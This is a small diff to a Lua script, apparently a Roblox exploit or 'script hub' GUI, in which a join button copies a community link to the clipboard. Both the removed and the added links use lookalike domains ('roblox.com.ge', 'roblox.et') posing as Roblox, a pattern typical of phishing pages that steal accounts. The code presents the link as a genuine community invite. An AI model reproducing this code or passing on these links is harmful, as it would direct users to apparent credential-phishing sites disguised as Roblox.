@@ -184,7 +184,7 @@ status.LayoutOrder = 7
 status.Parent = card
 
 joinBtn.MouseButton1Click:Connect(function()
-    setclipboard("https://roblox.com.ge/communities/7529853142/")
+    setclipboard("https://www.roblox.et/communities/4144267633/KeyHubScript")
     status.TextColor3 = Color3.fromRGB(100, 180, 255)
     status.Text = "✅ Link copied to clipboard!"
 end)
